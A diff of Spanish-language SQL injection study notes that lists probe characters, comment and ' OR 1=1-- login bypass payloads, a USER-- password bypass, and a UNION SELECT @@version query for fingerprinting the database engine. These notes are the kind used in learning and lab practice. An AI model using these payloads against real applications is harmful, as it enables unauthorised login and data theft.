@@ -1,15 +1,27 @@
-flags
+-FLAGS-
 
-# I D E N T I F I C A R L A V U L N E R A B I L I D A D
+###> IDENTIFICAR LA VULNERABILIDAD
 
-' / simbolo comun para testear si existe el SQLi o no.
-" / simbolo comun para testear si existe el SQLi o no.
--- / dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues de los simbolos, se ignora.
-' OR 1=1-- / dentro del lenguaje de SQL query, lo que busca es crear una condicion donde sea "true" y la primera consulta muestre
-el contenido de la busqueda.
+' | simbolo comun para testear si existe el SQLi o no.
+
+" | simbolo comun para testear si existe el SQLi o no.
+
+###> BYPASS COMUNES
+
+-- | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues de los simbolos, se ignora.
+ex: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+
+' OR 1=1-- | sirve para crear una consulta a un resultado booleano, de manera que el inicio de la consulta es leido, el resto no ya que
+es siempre TRUE.
+
+USER-- | cuando se tiene un usuario se podria probar la vulnerabilidad tratando de ver si hace bypass sin ingresar la contrasena.
 
 
-# I D E N T I F I C A R I N F O R M A C I O N D E L M O T O R D E B A S E D E D A T O S
+###> IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS
+  (para recolectar informacion de la base de datos, debe estar presente el SQLi donde muestre en respuesta (pantalla) data. debe ir despues
+de la opcion UNION)
+
+ex: ' UNION SELECT @@version
 
 Microsoft : SELECT @@version
 MySQL : SELECT @@version
